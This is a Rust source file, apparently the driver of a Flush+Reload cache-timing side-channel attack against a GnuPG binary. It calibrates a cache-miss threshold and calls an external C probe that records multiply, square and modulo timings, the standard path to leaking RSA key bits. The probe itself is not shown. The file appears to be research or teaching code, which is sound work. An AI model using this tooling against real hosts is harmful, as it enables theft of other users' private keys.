#![feature(asm)]
extern crate colored;
extern crate libc;
use colored::*;
use libc::uint64_t;
use std::ffi;
use std::path::Path;
pub mod asm;
pub mod calibration;
pub mod decode;

const SLOTS: usize = 20000;

#[link(name = "probe")]
extern "C" {
    fn probe(
        threshhold: uint64_t,
        path: *const libc::c_char,
        mul_timings: *mut uint64_t,
        sqr_timings: *mut uint64_t,
        mod_timings: *mut uint64_t,
        SLOTS: uint64_t,
    ) -> libc::c_void;
}

fn c_begin_probe(threshhold: u32, path: &Path) {
    let c_path = ffi::CString::new(path.to_str().unwrap()).unwrap();
    let mut mul_timings: [u64; SLOTS] = [0; SLOTS];
    let mut sqr_timings: [u64; SLOTS] = [0; SLOTS];
    let mut mod_timings: [u64; SLOTS] = [0; SLOTS];
    unsafe {
        probe(
            threshhold as uint64_t,
            c_path.as_ptr() as *const libc::c_char,
            mul_timings.as_mut_ptr() as *mut uint64_t,
            sqr_timings.as_mut_ptr() as *mut uint64_t,
            mod_timings.as_mut_ptr() as *mut uint64_t,
            SLOTS as uint64_t,
        );
    }
    decode::print_arr(&mul_timings, &sqr_timings, &mod_timings, threshhold);
}

fn main() {
    /*Make current thread run on the 0th CPU*/
    let cpu: scheduler::CpuSet = scheduler::CpuSet::single(0);
    scheduler::set_affinity(std::process::id() as i32, cpu).unwrap();
    if std::env::args().count() != 2 {
        println!(
            "{}",
            format!("Argument Error! Please insert the path of GnuPG as an argument!")
                .red()
                .bold()
        );
        panic!();
    }
    let mut args: Vec<String> = std::env::args().collect();
    let path = Path::new(&args[1]);
    if !path.exists() || !path.is_file() {
        println!(
            "{}",
            format!("{} does not exist!", path.to_str().unwrap())
                .red()
                .bold()
        );
        panic!();
    }
    println!("{}", "Flush Reload Test!".blue().bold());
    /*Get threshhold that signifies that a memory access missed*/
    let threshhold = unsafe { calibration::get_threshhold() };
    println!(
        "{} {}",
        "The threshhold is:".yellow().bold(),
        format!("{} cycles", threshhold).yellow().bold()
    );
    c_begin_probe(threshhold, &path);
    //unsafe{decode::gpg_probe::probe(threshhold, &path)};
}
